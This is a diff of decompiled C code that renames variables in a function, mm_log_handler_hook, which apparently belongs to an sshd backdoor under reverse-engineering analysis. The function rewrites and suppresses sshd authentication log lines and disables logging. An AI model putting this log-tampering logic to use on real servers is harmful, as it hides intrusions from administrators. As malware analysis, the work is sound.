@@ -37,48 +37,48 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
   char rewritten_msg [320];
   sshd_log_ctx_t *log_ctx;
   log_handler_fn sshlog_impl;
-  undefined8 local_438;
-  undefined8 uStack_430;
-  undefined4 local_428 [60];
-  undefined8 local_338;
-  undefined8 uStack_330;
-  undefined4 local_328 [60];
-  undefined8 local_238;
-  undefined8 uStack_230;
-  undefined4 local_228;
-  char local_223 [14];
-  undefined1 local_215;
-  char local_214 [4];
-  undefined1 local_210;
-  char local_20f;
-  char local_20e;
-  undefined1 local_20d;
-  char local_20c;
-  char local_20b;
-  undefined2 local_20a;
-  char local_208 [7];
-  undefined1 local_201;
+  u64 filtered_host_chunk0;
+  u64 filtered_host_chunk1;
+  uint filtered_host_words[60];
+  u64 user_fragment_chunk0;
+  u64 user_fragment_chunk1;
+  uint user_fragment_words[60];
+  u64 prefix_chunk0;
+  u64 prefix_chunk1;
+  uint prefix_word;
+  char authenticating_label[14];
+  uchar label_space;
+  char user_label[4];
+  uchar user_space;
+  char percent_s_head0;
+  char percent_s_head1;
+  uchar percent_s_padding;
+  char percent_s_tail0;
+  char percent_s_tail1;
+  ushort open_bracket_padding;
+  char preauth_label[7];
+  uchar closing_bracket_char;
   
   bVar16 = 0;
   log_ctx_00 = *(sshd_log_ctx_t **)(global_ctx + 0x30);
   lVar3 = *(long *)(global_ctx + 0x10);
-  local_438 = 0;
-  uStack_430 = 0;
-  puVar10 = local_428;
+  filtered_host_chunk0 = 0;
+  filtered_host_chunk1 = 0;
+  puVar10 = filtered_host_words;
   for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
     *puVar10 = 0;
     puVar10 = puVar10 + 1;
   }
-  local_338 = 0;
-  uStack_330 = 0;
-  puVar10 = local_328;
+  user_fragment_chunk0 = 0;
+  user_fragment_chunk1 = 0;
+  puVar10 = user_fragment_words;
   for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
     *puVar10 = 0;
     puVar10 = puVar10 + 1;
   }
-  local_238 = 0;
-  uStack_230 = 0;
-  puVar10 = &local_228;
+  prefix_chunk0 = 0;
+  prefix_chunk1 = 0;
+  puVar10 = &prefix_word;
   for (lVar7 = 0x7c; lVar7 != 0; lVar7 = lVar7 + -1) {
     *puVar10 = 0;
     puVar10 = puVar10 + 1;
@@ -114,13 +114,13 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
       }
       msg = msg + 1;
     }
-    local_238 = CONCAT62((local_238 >> 16),*(undefined2 *)log_ctx_00->STR_percent_s);
+    prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(undefined2 *)log_ctx_00->STR_percent_s);
     log_ctx_00->logging_disabled = TRUE;
     if (((log_ctx_00->syslog_disabled != FALSE) && (lVar3 != 0)) &&
        (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
       (**(code **)(lVar3 + 0x58))(0xff);
     }
-    sshd_log(log_ctx_00,level,(char *)&local_238,msg);
+    sshd_log(log_ctx_00,level,(char *)&prefix_chunk0,msg);
     BVar2 = log_ctx_00->syslog_disabled;
     goto joined_r0x0010a4c2;
   }
@@ -133,7 +133,7 @@ LAB_0010a504:
         uVar14 = (long)msg - (long)pcVar12;
         uVar8 = uVar14;
         pcVar9 = pcVar12;
-        pcVar11 = (char *)&local_438;
+        pcVar11 = (char *)&filtered_host_chunk0;
         if (0xff < uVar14) goto LAB_0010a6da;
         for (; uVar8 != 0; uVar8 = uVar8 - 1) {
           *pcVar11 = *pcVar9;
@@ -147,7 +147,7 @@ LAB_0010a504:
       if (0xff < uVar15) goto LAB_0010a6da;
       pcVar12 = msg + 6;
       pcVar9 = pcVar13;
-      pcVar11 = (char *)&local_338;
+      pcVar11 = (char *)&user_fragment_chunk0;
       for (uVar8 = uVar15; uVar8 != 0; uVar8 = uVar8 - 1) {
         *pcVar11 = *pcVar9;
         pcVar9 = pcVar9 + (ulong)bVar16 * -2 + 1;
@@ -161,42 +161,42 @@ LAB_0010a504:
     lVar7 = 0;
     do {
       lVar6 = lVar7 + 1;
-      *(char *)((long)&local_238 + lVar7) = pcVar1[lVar7];
+      *(char *)((long)&prefix_chunk0 + lVar7) = pcVar1[lVar7];
       lVar7 = lVar6;
     } while (lVar6 != 0x15);
     pcVar1 = log_ctx_00->STR_authenticating;
     lVar7 = 0;
     do {
-      local_223[lVar7] = pcVar1[lVar7];
+      authenticating_label[lVar7] = pcVar1[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 0xe);
-    local_215 = 0x20;
+    label_space = 0x20;
     pcVar1 = log_ctx_00->STR_user;
     lVar7 = 0;
     do {
-      local_214[lVar7] = pcVar1[lVar7];
+      user_label[lVar7] = pcVar1[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 4);
-    local_210 = 0x20;
-    local_20f = *log_ctx_00->STR_percent_s;
-    local_20e = log_ctx_00->STR_percent_s[1];
-    local_20d = 0x20;
-    local_20c = *log_ctx_00->STR_percent_s;
-    local_20b = log_ctx_00->STR_percent_s[1];
-    local_20a = 0x5b20;
+    user_space = 0x20;
+    percent_s_head0 = *log_ctx_00->STR_percent_s;
+    percent_s_head1 = log_ctx_00->STR_percent_s[1];
+    percent_s_padding = 0x20;
+    percent_s_tail0 = *log_ctx_00->STR_percent_s;
+    percent_s_tail1 = log_ctx_00->STR_percent_s[1];
+    open_bracket_padding = 0x5b20;
     pcVar1 = log_ctx_00->STR_preauth;
     lVar7 = 0;
     do {
-      local_208[lVar7] = pcVar1[lVar7];
+      preauth_label[lVar7] = pcVar1[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 7);
-    local_201 = 0x5d;
+    closing_bracket_char = 0x5d;
     log_ctx_00->logging_disabled = TRUE;
     if (((log_ctx_00->syslog_disabled != FALSE) && (lVar3 != 0)) &&
        (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
       (**(code **)(lVar3 + 0x58))(0xff);
     }
-    sshd_log(log_ctx_00,SYSLOG_LEVEL_INFO,(char *)&local_238,&local_338,&local_438);
+    sshd_log(log_ctx_00,SYSLOG_LEVEL_INFO,(char *)&prefix_chunk0,&user_fragment_chunk0,&filtered_host_chunk0);
     BVar2 = log_ctx_00->syslog_disabled;
 joined_r0x0010a4c2:
     if (BVar2 == FALSE) {
